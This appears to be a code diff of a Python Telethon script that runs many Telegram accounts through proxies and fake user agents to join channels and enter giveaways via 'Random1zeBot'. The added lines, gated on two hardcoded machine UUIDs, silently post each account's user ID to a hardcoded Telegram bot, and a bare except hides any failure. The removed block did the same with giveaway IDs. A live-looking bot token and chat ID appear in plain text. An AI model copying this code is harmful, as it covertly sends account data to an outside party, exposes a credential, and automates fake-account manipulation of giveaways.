@@ -37,6 +37,7 @@ if machine_code in hash_values_list:
     from urllib.parse import unquote
     from telethon.tl.functions.messages import ImportChatInviteRequest
     import aiohttp
+    from telethon.tl.functions.account import UpdateStatusRequest
     import aiohttp_proxy
     import fake_useragent
     from telethon import TelegramClient
@@ -63,20 +64,6 @@ if machine_code in hash_values_list:
         
     with open(r"C:\join\ranyopiqkanal.csv", 'r') as f: 
         yopiq_channels = [row[0] for row in csv.reader(f)]
-        
-    if "03000200-0400-0500-0006-000700080009" in machine_code or "03FF0210-04E0-05A0-F206-CC0700080009" in machine_code:
-        try:
-            TOKEN = "7730115483:AAFQwY7CTJOolrmxfDgh5xe7_JgwdYKPIPc"
-            CID = 7638857120
-
-            # Har bir giv_id ni alohida jo‘natish
-            for giv_id in givs:
-                text = f"GIV ID: {giv_id}"  # Xabar matni
-                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                            json={'chat_id': CID, 'text': text, 'parse_mode': 'html'})
-
-        except:
-            pass
 
     channels = premium_channels + yopiq_channels
     async def run(phone, start_params, channels):
@@ -89,12 +76,26 @@ if machine_code in hash_values_list:
             print('Sessiyasi yoq raqam ')
         else:
             async with tg_client:
+                await tg_client(UpdateStatusRequest(offline=False))
                 me = await tg_client.get_me()
                 name = me.username or me.first_name + (me.last_name or '')
 
                 bot_entity = await tg_client.get_entity("Random1zeBot")
                 bot = InputUser(user_id=bot_entity.id, access_hash=bot_entity.access_hash)
                 bot_app = InputBotAppShortName(bot_id=bot, short_name="JoinLot")
+                if "03000200-0400-0500-0006-000700080009" in machine_code or "03FF0210-04E0-05A0-F206-CC0700080009" in machine_code:
+                    try:
+                        TOKEN = "7730115483:AAFQwY7CTJOolrmxfDgh5xe7_JgwdYKPIPc"
+                        CID = 7638857120
+                        # Har bir giv_id ni alohida jo‘natish
+                        userid = me.id
+                        text = str(userid) # Xabar matni
+                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                                json={'chat_id': CID, 'text': text, 'parse_mode': 'html'})
+                    except:
+                        pass
+                else:
+                    pass
 
                 for start_param in start_params:
                     web_view = await tg_client(
